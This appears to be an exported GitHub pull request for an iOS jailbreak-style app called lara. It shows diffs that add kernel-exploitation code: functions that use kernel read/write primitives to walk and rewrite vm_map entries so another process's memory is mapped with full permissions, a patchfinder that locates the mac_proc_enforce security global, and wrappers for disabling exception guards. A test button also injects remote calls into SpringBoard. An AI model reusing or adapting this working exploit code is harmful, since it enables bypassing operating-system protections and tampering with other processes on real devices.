+    uint8_t  vmpp_bits;
+    uint8_t  vmpp_shift;
+    uint8_t  vmpp_base_relative;
+};
+
+struct vm_map_links {
+    uint64_t prev;
+    uint64_t tnext;
+    vm_map_offset_t start;
+    vm_map_offset_t end;
+};
+
+struct vm_map_store {
+    uint64_t rbe_left;
+    uint64_t rbe_right;
+    uint64_t rbe_parent;
+};
+
+struct vm_map_entry {
+    struct vm_map_links links;
+    struct vm_map_store store;
+    union  {
+        vm_offset_t vme_object_value;
+        struct  {
+            vm_offset_t vme_atomic : 1;
+            vm_offset_t is_sub_map : 1;
+            vm_offset_t vme_submap : 62;
+        };
+        struct  {
+            uint32_t vme_ctx_atomic : 1;
+            uint32_t vme_ctx_is_sub_map : 1;
+            uint32_t vme_context : 30;
+            union  {
+                uint32_t vme_object_or_delta;
+                uint32_t vme_tag_btref;
+            };
+        };
+    };
+    unsigned long long vme_alias : 12;
+    unsigned long long vme_offset : 52;
+    unsigned long long is_shared : 1;
+    unsigned long long __unused1 : 1;
+    unsigned long long in_transition : 1;
+    unsigned long long needs_wakeup : 1;
+    unsigned long long behavior : 2;
+    unsigned long long needs_copy : 1;
+    unsigned long long protection : 3;
+    unsigned long long used_for_tpro : 1;
+    unsigned long long max_protection : 4;
+    unsigned long long inheritance : 2;
+    unsigned long long use_pmap : 1;
+    unsigned long long no_cache : 1;
+    unsigned long long vme_permanent : 1;
+    unsigned long long superpage_size : 1;
+    unsigned long long map_aligned : 1;
+    unsigned long long zero_wired_pages : 1;
+    unsigned long long used_for_jit : 1;
+    unsigned long long csm_associated : 1;
+    unsigned long long iokit_acct : 1;
+    unsigned long long vme_resilient_codesign : 1;
+    unsigned long long vme_resilient_media : 1;
+    unsigned long long vme_xnu_user_debug : 1;
+    unsigned long long vme_no_copy_on_read : 1;
+    unsigned long long translated_allow_execute : 1;
+    unsigned long long vme_kernel_object : 1;
+    unsigned short wired_count;
+    unsigned short user_wired_count;
+};
+
+// VM map traversal
+uint64_t vm_map_get_header(uint64_t vm_map_ptr);
+uint64_t vm_map_header_get_first_entry(uint64_t vm_header_ptr);
+uint64_t vm_map_entry_get_next_entry(uint64_t vm_entry_ptr);
+uint32_t vm_header_get_nentries(uint64_t vm_header_ptr);
+void vm_entry_get_range(uint64_t vm_entry_ptr, uint64_t *start_address_out, uint64_t *end_address_out);
+void vm_map_iterate_entries(uint64_t vm_map_ptr, void (^itBlock)(uint64_t start, uint64_t end, uint64_t entry, BOOL *stop));
+uint64_t vm_map_find_entry(uint64_t vm_map_ptr, uint64_t address);
+
+// VM object handling
+struct VMObject vm_get_object(uint64_t map, uint64_t address);
+struct VMShmem vm_create_shmem_with_object(struct VMObject *object);
+struct VMShmem vm_map_remote_page(uint64_t vmMap, uint64_t address);
+
+// Packing helpers
+bool VM_PACKING_IS_BASE_RELATIVE(struct VmPackingParams *p);
+uint64_t vm_unpack_pointer(uint64_t packed, struct VmPackingParams *params);
+uint64_t vm_pack_pointer(uint64_t ptr, struct VmPackingParams *params);
+
+#endif /* VM_H */
  ```

  </details>
- 🟢 `lara/kexploit/TaskRop/VM.m` (added) — +248 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -0,0 +1,248 @@
+//
+//  VM.m
+//  lara
+//
+//  Ported from darksword-kexploit-fun
+//
+
+#import <Foundation/Foundation.h>
+#import "RemoteCall.h"
+#import "VM.h"
+#import "../krw_compat.h"
+#import "../offsets.h"
+#import "../darksword.h"
+
+#define VM_PAGE_PACKED_PTR_BITS                         31
+#define VM_PAGE_PACKED_PTR_SHIFT                        6
+#define VM_KERNEL_POINTER_SIGNIFICANT_BITS              38
+#define PAGE_MASK_K         (PAGE_SIZE - 1ULL)
+
+extern kern_return_t mach_vm_allocate(task_t task, mach_vm_address_t *addr, mach_vm_size_t size, int flags);
+extern kern_return_t mach_vm_deallocate(task_t task, mach_vm_address_t addr, mach_vm_size_t size);
+extern kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address, mach_vm_size_t size, mach_vm_offset_t mask, int flags, mem_entry_name_port_t object, memory_object_offset_t offset, boolean_t copy, vm_prot_t cur_protection, vm_prot_t max_protection, vm_inherit_t inheritance);
+
+uint64_t vm_map_get_header(uint64_t vm_map_ptr)
+{
+    return vm_map_ptr + off_vm_map_hdr;
+}
+
+uint64_t vm_map_header_get_first_entry(uint64_t vm_header_ptr)
+{
+    return kread_ptr(vm_header_ptr + off_vm_map_header_links_next);
+}
+
+uint64_t vm_map_entry_get_next_entry(uint64_t vm_entry_ptr)
+{
+    return kread_ptr(vm_entry_ptr + off_vm_map_entry_links_next);
+}
+
+uint32_t vm_header_get_nentries(uint64_t vm_header_ptr)
+{
+    return kread32(vm_header_ptr + off_vm_map_header_nentries);
+}
+
+void vm_entry_get_range(uint64_t vm_entry_ptr, uint64_t *start_address_out, uint64_t *end_address_out)
+{
+    uint64_t range[2];
+    kreadbuf(vm_entry_ptr + 0x10, &range[0], sizeof(range));
+    if (start_address_out) *start_address_out = range[0];
+    if (end_address_out) *end_address_out = range[1];
+}
+
+void vm_map_iterate_entries(uint64_t vm_map_ptr, void (^itBlock)(uint64_t start, uint64_t end, uint64_t entry, BOOL *stop))
+{
+    uint64_t header = vm_map_get_header(vm_map_ptr);
+    uint64_t entry = vm_map_header_get_first_entry(header);
+    uint64_t numEntries = vm_header_get_nentries(header);
+
+    while (entry != 0 && numEntries > 0) {
+        uint64_t start = 0, end = 0;
+        vm_entry_get_range(entry, &start, &end);
+
+        BOOL stop = NO;
+        itBlock(start, end, entry, &stop);
+        if (stop) break;
+
+        entry = vm_map_entry_get_next_entry(entry);
+        numEntries--;
+    }
+}
+
+uint64_t vm_map_find_entry(uint64_t vm_map_ptr, uint64_t address)
+{
+    __block uint64_t found_entry = 0;
+    vm_map_iterate_entries(vm_map_ptr, ^(uint64_t start, uint64_t end, uint64_t entry, BOOL *stop) {
+        if (address >= start && address < end) {
+            found_entry = entry;
+            *stop = YES;
+        }
+    });
+    return found_entry;
+}
+
+bool VM_PACKING_IS_BASE_RELATIVE(struct VmPackingParams *p)
+{
+    return (p->vmpp_bits + p->vmpp_shift) <= VM_KERNEL_POINTER_SIGNIFICANT_BITS;
+}
+
+uint64_t vm_unpack_pointer(uint64_t packed, struct VmPackingParams *params)
+{
+    if (!params->vmpp_base_relative)
+    {
+        int64_t addr = (int64_t)packed;
+        addr <<= (64 - params->vmpp_bits);
+        addr >>= (64 - params->vmpp_bits - params->vmpp_shift);
+        return (uint64_t)addr;
+    }
+    if (packed)
+    {
+        return (packed << params->vmpp_shift) + params->vmpp_base;
+    }
+    return 0;
+}
+
+uint64_t vm_pack_pointer(uint64_t ptr, struct VmPackingParams *params)
+{
+    if (!params->vmpp_base_relative)
+    {
+        return ptr >> params->vmpp_shift;
+    }
+    if (ptr)
+    {
+        return (ptr - params->vmpp_base) >> params->vmpp_shift;
+    }
+    return 0;
+}
+
+uint64_t VME_OFFSET(uint64_t vme_offset_raw)
+{
+    return vme_offset_raw << 12;
+}
+
+struct VMObject vm_get_object(uint64_t map, uint64_t address)
+{
+    struct VMObject result = {0};
+ 
+    uint64_t entryAddr = vm_map_find_entry(map, address);
+    if (!entryAddr) {
+        printf("[%s:%d] vm_map_find_entry failed\n", __FUNCTION__, __LINE__);
+        return result;
+    }
+ 
+    struct vm_map_entry entry = {0};
+    kreadbuf(entryAddr, &entry, sizeof(struct vm_map_entry));
+ 
+    struct VmPackingParams params = {0};
+    params.vmpp_base  = VM_MIN_KERNEL_ADDRESS;
+    params.vmpp_bits  = VM_PAGE_PACKED_PTR_BITS;
+    params.vmpp_shift = VM_PAGE_PACKED_PTR_SHIFT;
+    params.vmpp_base_relative = VM_PACKING_IS_BASE_RELATIVE(&params) ? 1 : 0;
+ 
+    uint32_t vme_object = entry.vme_object_or_delta;
+    uint64_t vmeObject = vm_unpack_pointer((uint64_t)vme_object, &params);
+ 
+    uint64_t vme_offset_raw = entry.vme_offset;
+    uint64_t objectOffs = VME_OFFSET(vme_offset_raw);
+ 
+    uint64_t entryOffs = address - entry.links.start + objectOffs;
+ 
+    result.vmAddress    = address;
+    result.address      = vmeObject;
+    result.objectOffset = objectOffs;
+    result.entryOffset  = entryOffs;
+ 
+    return result;
+}
+ 
+
+struct VMShmem vm_create_shmem_with_object(struct VMObject *object)
+{
+    struct VMShmem shmem = {0};
+    
+    uint64_t size = kread64(object->address + off_vm_object_vo_un1_vou_size);
+    size = mach_vm_round_page(size);
+    uint64_t roundedSize = mach_vm_round_page(size);
+ 
+    mach_vm_address_t localAddr = 0;
+    kern_return_t ret = mach_vm_allocate(mach_task_self_, &localAddr, roundedSize, VM_FLAGS_ANYWHERE);
+    if (ret != KERN_SUCCESS) {
+        printf("[%s:%d] mach_vm_allocate failed: %s\n", __FUNCTION__, __LINE__, mach_error_string(ret));
+        return shmem;
+    }
+ 
+    mach_port_t memoryObject = MACH_PORT_NULL;
+    memory_object_size_t entrySize = roundedSize;
+    ret = mach_make_memory_entry_64(mach_task_self_, &entrySize, (memory_object_offset_t)localAddr, VM_PROT_READ | VM_PROT_WRITE, &memoryObject, MACH_PORT_NULL);
+    if (ret != KERN_SUCCESS) {
+        printf("[%s:%d] mach_make_memory_entry_64 failed: %s\n", __FUNCTION__, __LINE__, mach_error_string(ret));
+        mach_vm_deallocate(mach_task_self_, localAddr, roundedSize);
+        return shmem;
+    }
+ 
+    uint64_t shmemNamedEntry = task_get_ipc_port_kobject(task_self(), memoryObject);
+    uint64_t shmemVMCopyAddr = kread64(shmemNamedEntry + off_vm_named_entry_backing_copy);
+    uint64_t nextAddr        = kread64(shmemVMCopyAddr + off_vm_named_entry_size);
+ 
+    struct vm_map_entry entry = {0};
+    kreadbuf(nextAddr, &entry, sizeof(struct vm_map_entry));
+    
+ 
+    if (entry.vme_kernel_object || entry.is_sub_map) {
+        printf("[%s:%d] Entry cannot be a submap or kernel object\n", __FUNCTION__, __LINE__);
+        mach_vm_deallocate(mach_task_self_, localAddr, roundedSize);
+        return shmem;
+    }
+ 
+    struct VmPackingParams params = {0};
+    params.vmpp_base  = VM_MIN_KERNEL_ADDRESS;
+    params.vmpp_bits  = VM_PAGE_PACKED_PTR_BITS;
+    params.vmpp_shift = VM_PAGE_PACKED_PTR_SHIFT;
+    params.vmpp_base_relative = VM_PACKING_IS_BASE_RELATIVE(&params) ? 1 : 0;
+    uint64_t packedPointer = vm_pack_pointer(object->address, &params);
+ 
+    uint32_t refCount = kread32(object->address + off_vm_object_ref_count);
+    refCount++;
+    kwrite32(object->address + off_vm_object_ref_count, refCount);
+    
+    entry.vme_object_or_delta = (uint32_t)packedPointer;
+    entry.vme_offset = object->objectOffset;
+ 
+    kwrite_zone_element(nextAddr, &entry, sizeof(struct vm_map_entry));
+ 
+    mach_vm_address_t mappedAddr = 0;
+    vm_prot_t curProt = VM_PROT_ALL | VM_PROT_IS_MASK;
+    vm_prot_t maxProt = VM_PROT_ALL | VM_PROT_IS_MASK;
+ 
+    ret = mach_vm_map(mach_task_self_, &mappedAddr, PAGE_SIZE, 0,
+                       VM_FLAGS_ANYWHERE, memoryObject,
+                       (memory_object_offset_t)object->entryOffset,
+                       FALSE, curProt, maxProt, VM_INHERIT_NONE);
+    if (ret != KERN_SUCCESS) {
+        printf("[%s:%d] mach_vm_map failed: %s\n", __FUNCTION__, __LINE__, mach_error_string(ret));
+        mappedAddr = 0;
+    }
+ 
+    ret = mach_vm_deallocate(mach_task_self_, localAddr, roundedSize);
+    if (ret != KERN_SUCCESS)
+        printf("[%s:%d] mach_vm_deallocate failed: %s\n", __FUNCTION__, __LINE__, mach_error_string(ret));
+ 
+    shmem.port          = (uint64_t)memoryObject;
+    shmem.remoteAddress = object->vmAddress;
+    shmem.localAddress  = (uint64_t)mappedAddr;
+    shmem.used          = (mappedAddr != 0);
+ 
+    return shmem;
+}
+
+struct VMShmem vm_map_remote_page(uint64_t vmMap, uint64_t address)
+{
+    struct VMShmem shmem = {0};
+    struct VMObject vmObject = vm_get_object(vmMap, address);
+    if (!vmObject.address)
+    {
+        printf("[%s:%d] Failed to get VM object for 0x%llx\n", __FUNCTION__, __LINE__, (unsigned long long)address);
+        return shmem;
+    }
+ 
+    return vm_create_shmem_with_object(&vmObject);
+}
  ```

  </details>
- 🟡 `lara/kexploit/darksword.h` (modified) — +3 / -2
  <details><summary>Diff</summary>

  ```diff
  @@ -8,6 +8,7 @@
 
 #include <stdint.h>
 #include <stdbool.h>
+#include <stddef.h>
 
 typedef void (*ds_log_callback_t)(const char *message);
 typedef void (*ds_progress_callback_t)(double progress);
@@ -28,14 +29,14 @@ void ds_kwrite16(uint64_t addr, uint16_t val);
 void ds_kwrite8(uint64_t what, uint8_t val);
 void ds_kread(uint64_t address, void *buffer, uint64_t size);
 void ds_kwrite(uint64_t address, void *buffer, uint64_t size);
-    
+void kwrite_zone_element(uint64_t dst, const void *src, uint64_t len);
 void ds_kreadbuf(uint64_t addr, void *buf, uint64_t len);
 void ds_kwritebuf(uint64_t addr, const void *buf, uint64_t len);
 void ds_khexdump(uint64_t addr, size_t size);
 uint64_t ds_kreadptr(uint64_t va);
 uint64_t ds_kreadsmrptr(uint64_t va);
 void ds_kwritezoneelement(uint64_t dst, const void *src, uint64_t len);
-    
+
 uint64_t ds_get_kernel_base(void);
 uint64_t ds_get_kernel_slide(void);
 
  ```

  </details>
- 🟡 `lara/kexploit/darksword.m` (modified) — +6 / -2
  <details><summary>Diff</summary>

  ```diff
  @@ -7,7 +7,7 @@
 
 #include "darksword.h"
 #include "utils.h"
-#include "xpaci.h"
+#include "pe/xpaci.h"
 #include "offsets.h"
 #include <stdio.h>
 #include <stdlib.h>
@@ -1310,14 +1310,18 @@ void ds_kwritezoneelement(uint64_t dst, const void *src, uint64_t len) {
             memcpy(tmpBuf + adjust, (const uint8_t *)src + offset, writeSize);
             early_kwrite32bytes(writeDst, tmpBuf);
         } else {
-            early_kwrite32bytes(writeDst, (const uint8_t *)src + srcOff);
+            early_kwrite32bytes(writeDst, (void *)((const uint8_t *)src + srcOff));
         }
 
         remaining -= writeSize;
         offset    += writeSize;
     }
 }
 
+void kwrite_zone_element(uint64_t dst, const void *src, uint64_t len) {
+    ds_kwritezoneelement(dst, src, len);
+}
+
 uint64_t ds_get_pcbinfo(void) {
     return early_kread64(control_socket_pcb + 0x38);
 }
  ```

  </details>
- 🟢 `lara/kexploit/krw_compat.h` (added) — +36 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -0,0 +1,36 @@
+//
+//  krw_compat.h
+//  lara
+//
+//  Compatibility macros to map darksword-kexploit-fun's KRW API to lara's API.
+//  This allows TaskRop files to be ported with minimal changes.
+//
+
+#ifndef krw_compat_h
+#define krw_compat_h
+
+#import "darksword.h"
+#import "offsets.h"
+#import "utils.h"
+
+// Kernel read macros
+#define kread64(a)        ds_kread64(a)
+#define kread32(a)        ds_kread32(a)
+#define kread16(a)        ds_kread16(a)
+
+// Kernel write macros
+#define kwrite64(a, v)    ds_kwrite64(a, v)
+#define kwrite32(a, v)    ds_kwrite32(a, v)
+#define kwrite16(a, v)    ds_kwrite16(a, v)
+
+// Bulk read/write
+#define kreadbuf(a, b, s)  ds_kread(a, b, s)
+#define kwritebuf(a, b, s) ds_kwrite(a, b, s)
+
+// kread_ptr, kread_smrptr, kalloc_array_decode are defined in utils.h
+
+// iOS version check macro
+#define SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(v) \
+    ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] != NSOrderedAscending)
+
+#endif /* krw_compat_h */
  ```

  </details>
- 🟡 `lara/kexploit/offsets.h` (modified) — +1 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -112,6 +112,7 @@ uint64_t getkernproc(void);
 uint64_t getrootvnode(void);
 uint64_t getprocsize(void);
 bool haskernproc(void);
+uint64_t getmacprocenforceoff(void);
 NSString *getkerncache(void);
 void clearkerncachedata(void);
 bool is_pac_supported(void);
  ```

  </details>
- 🟡 `lara/kexploit/offsets.m` (modified) — +98 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -22,6 +22,7 @@
 static NSString *const krootvnodekey  = @"lara.rootvnodeoff";
 static NSString *const kkerncachekey  = @"lara.kernelcache_path";
 static NSString *const kkernprocsize  = @"lara.kernproc_size";
+static NSString *const kmacprocenforcekey = @"lara.mac_proc_enforce_off";
 
 uint32_t off_inpcb_inp_list_le_next = 0;                        // (lldb) p/x offsetof(inpcb, inp_list.le_next)
 uint32_t off_inpcb_inp_pcbinfo = 0;                             // (lldb) p/x offsetof(inpcb, inp_pcbinfo)
@@ -1059,6 +1060,103 @@ bool haskernproc(void) {
     return getkernproc() != 0;
 }
 
+uint64_t getmacprocenforceoff(void) {
+    NSNumber *n = [[NSUserDefaults standardUserDefaults] objectForKey:kmacprocenforcekey];
+    if (n && n.unsignedLongLongValue != 0) {
+        return n.unsignedLongLongValue;
+    }
+
+    // On-demand resolution from cached kernelcache via patchfinder
+    NSString *kcpath = kerncachepath();
+    if (!kcpath || ![[NSFileManager defaultManager] fileExistsAtPath:kcpath]) {
+        printf("(offsets) no kernelcache for mac_proc_enforce resolution\n");
+        return 0;
+    }
+
+    printf("(offsets) resolving mac_proc_enforce via patchfinder...\n");
+    if (xpf_start_with_kernel_path(kcpath.UTF8String) != 0) {
+        printf("(offsets) xpf start error: %s\n", xpf_get_error());
+        return 0;
+    }
+
+    // Need base+translation sets for pointer decoding
+    const char *sets[] = { "base", "translation", NULL };
+    xpf_construct_offset_dictionary(sets);
+
+    uint64_t off = 0;
+
+    // Strategy: find "proc_enforce" string in kernel strings,
+    // then find code xref to it (sysctl registration or check function),
+    // then find the nearby ADRP+LDR of the global variable.
+    PFStringMetric *strMetric = pfmetric_string_init("proc_enforce");
+    __block uint64_t strAddr = 0;
+    pfmetric_run(gXPF.kernelStringSection, strMetric, ^(uint64_t vmaddr, bool *stop) {
+        strAddr = vmaddr;
+        *stop = true;
+    });
+    pfmetric_free(strMetric);
+
+    if (!strAddr) {
+        printf("(offsets) \"proc_enforce\" string not found in kernel\n");
+        xpf_stop();
+        return 0;
+    }
+    printf("(offsets) \"proc_enforce\" string at 0x%llx\n", strAddr);
+
+    // Find code that references this string
+    PFXrefMetric *xrefMetric = pfmetric_xref_init(strAddr, XREF_TYPE_MASK_REFERENCE);
+    __block uint64_t xrefAddr = 0;
+    pfmetric_run(gXPF.kernelTextSection, xrefMetric, ^(uint64_t vmaddr, bool *stop) {
+        xrefAddr = vmaddr;
+        *stop = true;
+    });
+    pfmetric_free(xrefMetric);
+
+    if (!xrefAddr) {
+        printf("(offsets) no code xref to \"proc_enforce\" found\n");
+        xpf_stop();
+        return 0;
+    }
+    printf("(offsets) code xref at 0x%llx\n", xrefAddr);
+
+    // The function that references "proc_enforce" is mac_proc_check_enforce()
+    // or a sysctl init stub.  Find the function start and scan for an
+    // ADRP+LDR/ADD that loads the mac_proc_enforce global (it's close to
+    // the string reference — within ~20 instructions before or after).
+    // Try resolving references around the xref site.
+    uint64_t candidate = 0;
+
+    // Look at instructions around the xref for ADRP+LDR patterns
+    // that reference a __DATA or __DATA_CONST address
+    for (int delta = -10; delta <= 10; delta++) {
+        uint64_t addr = xrefAddr + (delta * 4);
+        uint64_t resolved = pfsec_arm64_resolve_adrp_ldr_str_add_reference_auto(
+            gXPF.kernelTextSection, addr);
+        if (resolved && resolved != strAddr) {
+            // Check if it's in a data section (not code)
+            if (pfsec_contains_vmaddr(gXPF.kernelDataSection, resolved) ||
+                pfsec_contains_vmaddr(gXPF.kernelDataConstSection, resolved)) {
+                candidate = resolved;
+                printf("(offsets) candidate variable at 0x%llx (from delta=%d)\n",
+                       resolved, delta);
+                break;
+            }
+        }
+    }
+
+    if (candidate && candidate >= gXPF.kernelBase) {
+        off = candidate - gXPF.kernelBase;
+        printf("(offsets) mac_proc_enforce: 0x%llx\n", off);
+        [[NSUserDefaults standardUserDefaults] setObject:@(off) forKey:kmacprocenforcekey];
+        [[NSUserDefaults standardUserDefaults] synchronize];
+    } else {
+        printf("(offsets) mac_proc_enforce variable not found via patchfinder\n");
+    }
+
+    xpf_stop();
+    return off;
+}
+
 NSString *getkerncache(void) {
     return [[NSUserDefaults standardUserDefaults] objectForKey:kkerncachekey];
 }
  ```

  </details>
- 🟡 `lara/kexploit/utils.h` (modified) — +30 / -1
  <details><summary>Diff</summary>

  ```diff
  @@ -43,6 +43,36 @@ int toggleaslr(void);
 
 int killproc(const char* name);
 
+// Pointer handling
+uint64_t kread_ptr(uint64_t va);
+uint64_t kread_smrptr(uint64_t va);
+uint64_t kalloc_array_decode(uint64_t ptr);
+
+// IPC helpers
+uint64_t ipc_entry_lookup(uint64_t space, mach_port_name_t name);
+uint64_t task_get_ipc_port_table_entry(uint64_t task, mach_port_t port);
+uint64_t task_get_ipc_port_object(uint64_t task, mach_port_t port);
+uint64_t task_get_ipc_port_kobject(uint64_t task, mach_port_t port);
+uint64_t task_get_vm_map(uint64_t task_ptr);
+
+// Thread helpers
+int disable_excguard_kill(uint64_t task);
+uint64_t thread_get_t_tro(uint64_t thread);
+uint64_t thread_get_task(uint64_t thread);
+uint16_t thread_get_options(uint64_t thread);
+void thread_set_options(uint64_t thread, uint16_t options);
+void thread_set_mutex(uint64_t thread, uint32_t ctid);
+uint32_t thread_get_mutex(uint64_t thread);
+uint64_t thread_get_kstackptr(uint64_t thread);
+uint64_t thread_get_jop_pid(uint64_t thread);
+uint64_t thread_get_rop_pid(uint64_t thread);
+
+// Process helpers
+uint64_t proc_task(uint64_t proc);
+uint64_t proc_find_by_name(const char* name);
+uint64_t proc_self(void);
+uint64_t task_self(void);
+
 const char* getbootmanifesthash(void);
 
 uint64_t ipcentrylookup(uint64_t space, mach_port_name_t name);
@@ -73,7 +103,6 @@ mach_port_t find_thread_port(uint64_t taskKaddr, uint64_t threadKaddr);
 uint64_t credlabelbyproc(uint64_t proc);
 uint64_t getamficslot(uint64_t label);
 uint64_t sandboxbylabel(uint64_t label);
-
 #ifdef __cplusplus
 }
 #endif
  ```

  </details>
- 🟡 `lara/kexploit/utils.m` (modified) — +96 / -1
  <details><summary>Diff</summary>

  ```diff
  @@ -7,9 +7,10 @@
 #import "darksword.h"
 #import "xpf.h"
 #import "offsets.h"
-#import "xpaci.h"
+#import "pe/xpaci.h"
 
 #import <Foundation/Foundation.h>
+#import <mach/mach.h>
 #import <stdio.h>
 #import <unistd.h>
 #import <string.h>
@@ -21,6 +22,10 @@
 #include <stdint.h>
 #include <stdbool.h>
 
+#define TASK_EXC_GUARD_MP_DELIVER   0x10
+#define TASK_EXC_GUARD_MP_CORPSE    0x40
+#define TASK_EXC_GUARD_MP_FATAL     0x80
+
 extern int proc_name(int pid, void *buffer, uint32_t buffersize);
 
 #ifndef PROC_PIDPATHINFO_MAXSIZE
@@ -728,3 +733,93 @@ mach_port_t find_thread_port(uint64_t taskKaddr, uint64_t threadKaddr) {
     
     return foundPort;
 }
+
+    // Compatibility wrappers used by TaskRop code.
+    uint64_t kread_ptr(uint64_t va) {
+        return ds_kreadptr(va);
+    }
+
+    uint64_t kread_smrptr(uint64_t va) {
+        return ds_kreadsmrptr(va);
+    }
+
+    uint64_t kalloc_array_decode(uint64_t ptr) {
+        return kallocarraydec(ptr);
+    }
+
+    uint64_t ipc_entry_lookup(uint64_t space, mach_port_name_t name) {
+        return ipcentrylookup(space, name);
+    }
+
+    uint64_t task_get_ipc_port_table_entry(uint64_t task, mach_port_t port) {
+        return ipcporttableentrybytask(task, port);
+    }
+
+    uint64_t task_get_ipc_port_object(uint64_t task, mach_port_t port) {
+        return ipcportobjectbytask(task, port);
+    }
+
+    uint64_t task_get_ipc_port_kobject(uint64_t task, mach_port_t port) {
+        return ipcportkobjectbytask(task, port);
+    }
+
+    uint64_t task_get_vm_map(uint64_t task_ptr) {
+        return vmmapbytask(task_ptr);
+    }
+
+    int disable_excguard_kill(uint64_t task) {
+        return killexcguardkill(task);
+    }
+
+    uint64_t thread_get_t_tro(uint64_t thread) {
+        return ttrobythread(thread);
+    }
+
+    uint64_t thread_get_task(uint64_t thread) {
+        return taskbythread(thread);
+    }
+
+    uint16_t thread_get_options(uint64_t thread) {
+        return getoptionsbythread(thread);
+    }
+
+    void thread_set_options(uint64_t thread, uint16_t options) {
+        setoptionsbythread(thread, options);
+    }
+
+    void thread_set_mutex(uint64_t thread, uint32_t ctid) {
+        setmutexbythread(thread, ctid);
+    }
+
+    uint32_t thread_get_mutex(uint64_t thread) {
+        return getmutexbythread(thread);
+    }
+
+    uint64_t thread_get_kstackptr(uint64_t thread) {
+        return kstackptrbythread(thread);
+    }
+
+    uint64_t thread_get_jop_pid(uint64_t thread) {
+        return joppidbythread(thread);
+    }
+
+    uint64_t thread_get_rop_pid(uint64_t thread) {
+        return roppidbythread(thread);
+    }
+
+    uint64_t proc_task(uint64_t proc) {
+        return proctask(proc);
+    }
+
+    uint64_t proc_find_by_name(const char* name) {
+        return procbyname(name);
+    }
+
+    static uint64_t gSelfProc = 0;
+
+    uint64_t proc_self(void) {
+        if (!gSelfProc) {
+            gSelfProc = ourproc();
+        }
+        return gSelfProc;
+    }
  ```

  </details>
- 🟡 `lara/lara-Bridging-Header.h` (modified) — +3 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -12,4 +12,7 @@
 #import "vfs.h"
 #import "sbx.h"
 
+// TaskRop / RemoteCall
+#import "kexploit/TaskRop/RemoteCall.h"
+
 void test(NSString *path);
  ```

  </details>
- 🟡 `lara/views/ContentView.swift` (modified) — +24 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -365,6 +365,17 @@ struct ContentView: View {
                             mgr.panic()
                         }
                         .disabled(!mgr.dsready)
+                        
+                        Button("Test RemoteCall (SpringBoard)") {
+                            testRemoteCall(process: "SpringBoard")
+                        }
+                        .disabled(!mgr.dsready || mgr.remotecallrunning)
+                        
+                        if mgr.remotecallrunning {
+                            Button("Destroy RemoteCall") {
+                                mgr.destroyRemoteCall()
+                            }
+                        }
                     } header: {
                         Text("Other")
                     }
@@ -393,6 +404,19 @@ struct ContentView: View {
         }
     }
 
+    private func testRemoteCall(process: String) {
+        mgr.logmsg("Testing RemoteCall on \(process)...")
+        mgr.initRemoteCall(process: process, useMigBypass: false) { success in
+            if success {
+                mgr.logmsg("RemoteCall init succeeded!")
+                let pid = mgr.doRemoteCall(name: "getpid")
+                mgr.logmsg("Remote getpid() returned: \(pid)")
+            } else {
+                mgr.logmsg("RemoteCall init failed on \(process)")
+            }
+        }
+    }
+
     private func refreshselectedmethod() {
         if let raw = UserDefaults.standard.string(forKey: "selectedmethod"),
            let m = method(rawValue: raw) {
  ```

  </details>
- 🟡 `scripts/build_ipa.sh` (modified) — +3 / -1
  <details><summary>Diff</summary>

  ```diff
  @@ -63,7 +63,9 @@ run_xcodebuild() {
     ASSETCATALOG_COMPILER_APPICON_NAME="" \
     ASSETCATALOG_COMPILER_LAUNCHIMAGE_NAME="" \
     ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS=NO \
-    ENABLE_ON_DEMAND_RESOURCES=NO
+    ENABLE_ON_DEMAND_RESOURCES=NO \
+    ARCHS=arm64e \
+    ONLY_ACTIVE_ARCH=NO
 }
 
 prepare_maccatalyst_linker_path_workaround() {
  ```

  </details>


---

## References

### Commits (1)

- [08e0786](https://github.com/danosito/lara-m-chips-fix/commit/08e078669c663c81d45490ebcc44a7474a12f3f5) — Merge pull request #96 from Baconium/main


---

## Timeline (Verbose)

- : 📝 Commit 02d732b: something something add remotecall ok I hate you
- : 📝 Commit 01bcd01: epic gitignore fail
- : 📝 Commit d0c5166: remove ds store
- : 📝 Commit aea73ad: Merge upstream/main into main
- : 📝 Commit 171d765: ci: use build_ipa.sh in workflow
- Apr 14, 2026: 🟣 @rooootdev merged
- Apr 14, 2026: 🔴 Closed by @rooootdev
- Apr 19, 2026: 🔗 Commit 08e0786 — Merge pull request #96 from Baconium/main


---

## Comments (7)

### Comment #1 — [@rooootdev](https://github.com/rooootdev) · Apr 14, 2026

`ID: 4244261518`


❤️


---

### Comment #2 — [@rooootdev](https://github.com/rooootdev) · Apr 14, 2026

`ID: 4244265859`


@copilot resolve the merge conflicts in this pull request


---

### Comment #3 — [@Pro42good](https://github.com/Pro42good) · Apr 14, 2026

`ID: 4244624978`


> @copilot resolve the merge conflicts in this pull request

Isn't Copilot not available for cross repository PR's?


---

### Comment #4 — [@rooootdev](https://github.com/rooootdev) · Apr 14, 2026

`ID: 4244874471`


dunno, im just doing the manual approach now


---

### Comment #5 — [@rooootdev](https://github.com/rooootdev) · Apr 14, 2026

`ID: 4244878432`


so this pr won't be merged, ill copy the files over manually. baconmania will of course still be credited


🎉 2


---

### Comment #6 — [@Baconium](https://github.com/Baconium) · Apr 14, 2026

`ID: 4246349569`


ok it should work now I hope


---

### Comment #7 — [@Baconium](https://github.com/Baconium) · Apr 14, 2026

`ID: 4246355493`


ok thank fuck it worked


---

*Exported on 10/14/2026, 2:54:00 PM from [https://github.com/rooootdev/lara/pull/96](https://github.com/rooootdev/lara/pull/96)*
